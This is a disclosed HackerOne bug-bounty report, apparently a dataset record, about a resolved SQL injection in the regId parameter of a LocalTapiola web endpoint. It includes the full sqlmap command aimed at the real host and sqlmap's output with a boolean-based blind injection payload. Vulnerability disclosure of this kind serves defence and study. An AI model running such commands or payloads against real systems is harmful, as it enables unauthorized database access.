---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '200818'
original_report_id: '200818'
title: SQL Injection /webApp/cancel_iltakoulu regId parameter (viestinta.lahitapiola.fi)
weakness: SQL Injection
team_handle: localtapiola
created_at: '2017-01-24T15:17:44.396Z'
disclosed_at: '2017-02-11T08:56:10.268Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 26
tags:
- hackerone
- sql-injection
---

# SQL Injection /webApp/cancel_iltakoulu regId parameter (viestinta.lahitapiola.fi)

## Metadata

- HackerOne Report ID: 200818
- Weakness: SQL Injection
- Program: localtapiola
- Disclosed At: 2017-02-11T08:56:10.268Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Basic report information
**Summary:** There is a SQL Injection vulnerability on http://viestinta.lahitapiola.fi/webApp/cancel_iltakoulu?regId=478836614&locationId=464559674

**Domain:** viestinta.lahitapiola.fi

## Steps To Reproduce:

Tested on sqlmap framework with following command:
./sqlmap.py -u "http://viestinta.lahitapiola.fi/webApp/cancel_iltakoulu?regId=478836614&locationId=464559674" -p regId


## Additional material

  *sqlmap output below:

yasar@be:~/sqlmap# ./sqlmap.py -u "http://viestinta.lahitapiola.fi/webApp/cancel_iltakoulu?regId=478836614&locationId=464559674" -p regId

.. snip ..

GET parameter 'regId' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
sqlmap identified the following injection point(s) with a total of 56 HTTP(s) requests:

Parameter: regId (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: regId=478836614) AND 5454=5454 AND (5202=5202&locationId=464559674

[17:38:22] [INFO] the back-end DBMS is PostgreSQL
web application technology: Apache
back-end DBMS: PostgreSQL


## Related reports, best practices

* https://hackerone.com/reports/179751
* https://hackerone.com/reports/181826

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
